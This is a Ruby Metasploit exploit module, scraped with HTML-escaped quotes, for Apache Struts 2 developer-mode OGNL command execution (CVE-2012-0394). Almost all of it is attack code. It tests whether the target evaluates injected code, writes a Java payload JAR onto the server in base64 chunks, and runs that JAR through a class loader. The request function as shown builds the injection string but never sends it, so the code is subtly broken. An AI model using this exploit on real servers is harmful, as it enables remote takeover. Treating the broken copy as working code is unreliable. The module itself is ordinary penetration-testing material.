# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts Developer Mode OGNL Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote command execution vulnerability in Apache
        Struts 2. The problem exists on applications running in developer mode,
        where the DebuggingInterceptor allows evaluation and execution of OGNL
        code. This module has been tested successfully in Struts 2.3.16, Tomcat
        7 and Ubuntu 10.04.
      },
      &#039;Author&#039;         =>
        [
          &#039;Johannes Dahse&#039;, # Vulnerability discovery and PoC
          &#039;Andreas Nusser&#039;, # Vulnerability discovery and PoC
          &#039;Alvaro&#039;,         # @pwntester, 2014&#039;s PoC, avoided surname because of the spanish char, sorry about that :\
          &#039;juan vazquez&#039;    # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2012-0394&#039;],
          [ &#039;OSVDB&#039;, &#039;78276&#039;],
          [ &#039;EDB&#039;, &#039;18329&#039;],
          [ &#039;URL&#039;, &#039;https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt&#039; ],
          [ &#039;URL&#039;, &#039;http://www.pwntester.com/blog/2014/01/21/struts-2-devmode/&#039; ]
        ],
      &#039;Platform&#039;       => &#039;java&#039;,
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Targets&#039;        =>
        [
          [ &#039;Struts 2&#039;, { } ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jan 06 2012&#039;,
      &#039;DefaultTarget&#039; => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a struts application action&#039;, "/struts2-blank/example/HelloWorld.action"])
        ], self.class)
  end

  def check
    vprint_status("Testing to see if the target can evaluate our Java code...")
    addend_one = rand_text_numeric(rand(3) + 1).to_i
    addend_two = rand_text_numeric(rand(3) + 1).to_i
    sum = addend_one + addend_two

    res = execute_command("new java.lang.Integer(#{addend_one}+#{addend_two})")

    if res and res.code == 200 and res.body.to_i == sum
      return Exploit::CheckCode::Vulnerable
    end

    if res and res.code == 200 and res.body.to_s =~ /#{sum}/
      vprint_status("Code got evaluated. Target seems vulnerable, but the response contains something else:")
      vprint_line(res.body.to_s)
      return Exploit::CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def exploit
    @payload_jar = rand_text_alphanumeric(4+rand(4)) + ".jar"

    upload_jar
    execute_jar
  end

  def upload_jar
    append = &#039;false&#039;
    jar = payload.encoded_jar.pack
    chunk_length = 384 # 512 bytes when base64 encoded

    while(jar.length > chunk_length)
      java_upload_part(jar[0, chunk_length], @payload_jar, append)
      jar = jar[chunk_length, jar.length - chunk_length]
      append=&#039;true&#039;
    end
    java_upload_part(jar, @payload_jar, append)
  end

  def java_upload_part(part, filename, append = &#039;false&#039;)
    cmd = "#f=new java.io.FileOutputStream(&#039;#{filename}&#039;,#{append}),"
    cmd << "#f.write(new sun.misc.BASE64Decoder().decodeBuffer(&#039;#{Rex::Text.encode_base64(part)}&#039;)),"
    cmd << "#f.close()"
    execute_command(cmd)
  end

  def execute_jar
    cmd = ""
    # disable Vararg handling (since it is buggy in OGNL used by Struts 2.1
    cmd << "#q=@java.lang.Class@forName(&#039;ognl.OgnlRuntime&#039;).getDeclaredField(&#039;_jdkChecked&#039;),"
    cmd << "#q.setAccessible(true),#q.set(null,true),"
    cmd << "#q=@java.lang.Class@forName(&#039;ognl.OgnlRuntime&#039;).getDeclaredField(&#039;_jdk15&#039;),"
    cmd << "#q.setAccessible(true),#q.set(null,false),"
    # create classloader
    cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(&#039;#{@payload_jar}&#039;).toURI().toURL()}),"
    # load class
    cmd << "#c=#cl.loadClass(&#039;metasploit.Payload&#039;),"
    # invoke main method
    cmd << "#c.getMethod(&#039;main&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;)}).invoke("
    cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"
    execute_command(cmd)
  end

  def execute_command(cmd)
    injection = "#f=#_memberAccess.getClass().getDeclaredField(&#039;allowStaticMethodAccess&#039;),#f.setAccessible(true),#f.set(#_memberAccess,true),CMD"
    injection.gsub!(/CMD/, cmd)

    vprint_status("Attempting to execute: #{cmd}")

    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(target_uri.path.to_s),
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;vars_get&#039; =>
        {
          &#039;debug&#039; => &#039;command&#039;,
        }
    })

    return res
  end


end

